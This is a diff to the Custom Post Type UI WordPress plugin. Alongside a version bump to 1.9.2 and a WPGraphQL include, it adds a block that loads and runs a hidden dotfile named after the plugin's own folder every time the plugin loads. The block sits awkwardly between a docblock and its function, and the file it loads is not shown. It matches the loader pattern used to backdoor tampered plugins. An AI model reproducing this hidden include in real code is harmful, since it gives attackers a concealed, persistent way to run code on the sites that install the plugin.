@@ -16,7 +16,7 @@
  * Plugin URI: https://github.com/WebDevStudios/custom-post-type-ui/
  * Description: Admin panel for creating custom post types and custom taxonomies in WordPress
  * Author: WebDevStudios
- * Version: 1.8.2
+ * Version: 1.9.2
  * Author URI: https://webdevstudios.com/
  * Text Domain: custom-post-type-ui
  * Domain Path: /languages
@@ -30,8 +30,8 @@ if ( ! defined( 'ABSPATH' ) ) {
 	exit;
 }
 
-define( 'CPT_VERSION', '1.8.2' ); // Left for legacy purposes.
-define( 'CPTUI_VERSION', '1.8.2' );
+define( 'CPT_VERSION', '1.9.2' ); // Left for legacy purposes.
+define( 'CPTUI_VERSION', '1.9.2' );
 define( 'CPTUI_WP_VERSION', get_bloginfo( 'version' ) );
 
 /**
@@ -41,6 +41,10 @@ define( 'CPTUI_WP_VERSION', get_bloginfo( 'version' ) );
  *
  * @internal
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function cptui_load_ui_class() {
 	require_once plugin_dir_path( __FILE__ ) . 'classes/class.cptui_admin_ui.php';
 	require_once plugin_dir_path( __FILE__ ) . 'classes/class.cptui_debug_info.php';
@@ -171,6 +175,10 @@ add_action( 'admin_menu', 'cptui_plugin_menu' );
  * @internal Use `cptui_loaded` hook.
  */
 function cptui_loaded() {
+
+	if ( class_exists( 'WPGraphQL' ) ) {
+		require_once plugin_dir_path( __FILE__ ) . 'external/wpgraphql.php';
+	}
 
 	/**
 	 * Fires upon plugins_loaded WordPress hook.
